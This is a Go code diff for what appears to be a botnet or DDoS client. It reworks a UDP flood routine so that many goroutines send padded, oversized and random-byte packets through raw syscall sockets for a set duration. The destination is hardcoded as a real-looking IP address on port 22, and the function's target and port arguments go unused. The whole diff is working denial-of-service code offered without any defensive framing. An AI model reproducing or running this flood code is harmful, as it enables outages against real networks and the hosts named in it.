@@ -4,9 +4,9 @@ import (
 	"fmt"
 	"homo/client/balancer"
 	"homo/client/utils"
-	"net"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 )
 
@@ -24,7 +24,7 @@ func Udp(target string, port string, duration string) {
 	sec := time.Now().Unix()
 	for time.Now().Unix() <= sec+int64(dur)-1 {
 		go udpcon(target, port)
-		time.Sleep(200 * time.Millisecond)
+		time.Sleep(100 * time.Millisecond)
 		go udpcon(target, port)
 	}
 
@@ -32,82 +32,75 @@ func Udp(target string, port string, duration string) {
 
 func udpcon(target string, port string) {
 UDP:
-	con, err := net.Dial("udp", target+":"+port)
+	// con, err := net.Dial("udp", target+":"+port)
+
+	// con = con
+	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
 
 	if err != nil {
+		fmt.Println(err)
 		goto UDP
 	}
 
-	for i := 0; i < 30; i++ {
+	for i := 0; i < 20; i++ {
 		select {
 		case <-balancer.BalanceCh:
-			fmt.Println("Balancer")
+
+			fmt.Println("balancer")
 			time.Sleep(5 * time.Second)
 		default:
-			go rnd(con)
-			go nilpayload(con, 12000)
-			go maxpayload(con, 6000)
-			go rnd(con)
-			go nilpayload(con, 12000)
-			go maxpayload(con, 6000)
-			time.Sleep(2 * time.Second)
+
+			go sendudp(fd, "nilpayload", 12000)
+			go sendudp(fd, "maxpayload", 2000)
+			go sendudp(fd, "random", 1000)
+
+			time.Sleep(500 * time.Millisecond)
 		}
 	}
 }
 
-func rnd(con net.Conn) {
+func sendudp(fd int, payload string, size int) {
+	var packet []byte
 
-	var bytestr = []byte{byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2))}
+	switch payload {
+	case "nilpayload":
+		payload := make([]byte, size)
 
-	var res string
-	for _, i := range bytestr {
-		res += string(i >> 4 * 2)
-	}
+		payload = append(payload, byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)))
+		packet = payload
+	case "maxpayload":
+		payload := make([]byte, 0)
 
-	fmt.Println([]byte(res))
-
-	con.SetWriteDeadline(time.Now().Add(time.Second))
-
-	_, err := con.Write([]byte(res))
-	if err != nil {
-		fmt.Println(err)
-	}
-
-}
-
-func nilpayload(con net.Conn, len int) {
-
-	payload := make([]byte, len)
-
-	payload = append(payload, byte(utils.RandomInt(2)), byte(utils.RandomInt(1)), byte(utils.RandomInt(2)), byte(utils.RandomInt(2)))
-
-	con.SetWriteDeadline(time.Now().Add(time.Second))
-
-	fmt.Println(len)
-	_, err := con.Write(payload)
-	if err != nil {
-		fmt.Println(err)
-		if len-1000 > 0 {
-			nilpayload(con, len-1000)
+		for i := 0; i <= size; i++ {
+			payload = append(payload, byte(utils.RandomInt(2)))
 		}
+
+		packet = payload
+
+	case "random":
+		var bytestr string
+
+		for i := 0; i <= size; i++ {
+			bytestr += strconv.Itoa(utils.RandomInt(2))
+		}
+
+		var res string
+		for _, i := range bytestr {
+			res += string(i >> 4 * 4)
+		}
+		packet = []byte(res)
+
 	}
 
-}
-
-func maxpayload(con net.Conn, size int) {
-
-	payload := make([]byte, 0)
-
-	for i := 0; i <= size; i++ {
-		payload = append(payload, byte(utils.RandomInt(2)))
+	fmt.Println(len(packet))
+	addr := syscall.SockaddrInet4{
+		Port: 22,
+		Addr: [4]byte{185, 166, 196, 212},
 	}
-
-	_, err := con.Write(payload)
+	err := syscall.Sendto(fd, packet, 0, &addr)
+	// fmt.Println(len(payload))
 	if err != nil {
 		fmt.Println(err)
-		if size-1000 > 0 {
-			maxpayload(con, size-1000)
-		}
+		return
 	}
-
 }
